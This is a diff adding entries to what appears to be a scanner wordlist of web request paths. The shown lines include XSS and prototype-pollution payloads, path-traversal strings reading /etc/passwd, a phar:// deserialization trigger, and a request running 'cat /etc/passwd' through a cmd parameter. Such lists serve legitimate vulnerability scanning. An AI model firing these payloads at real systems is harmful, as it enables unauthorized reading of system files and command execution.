@@ -8930,3 +8930,17 @@ test&access={{interactsh-url}}&remote_url={{interactsh-url}}&admin={{interactsh-
 /?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x
 /common/setup.php
 /help/index.jsp?view=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/console
+/settings/calendar/?f=&rpath=https://{{Hostname}}/cdav/calendar
+/wp-content/plugins/find-and-replace-content/readme.txt
+/wp-content/plugins/wp-whydonate/readme.txt
+/cheatset
+/opt/config/database.yml
+/var/config/database.yml
+/var/company_name/config/database.yml
+/wp-content/plugins/lisfinity-core/readme.txt
+/admin/reports/custom-report/download-csv?exportFile=../../../../../../../../../../../../../../../etc/passwd
+/index.php?sgpb_type=phar://wp-content/uploads/2021/12/1.zip/
+/error?StatusCode=404&file=~/web.config
+/view/theme/redbasic/php/style.pcss?f=&puid=2&schema=../../../../shell&v=7.1.6&cmd=cat%20/etc/passwd
+/ViewSource/?file=de/robv/android/xposed/installer/repo/RepoDb.java&md5=36570c6fac687ffe08107e6a72bd3da7/../../../../../../../../../../../private/etc/passwd%00&type=apk
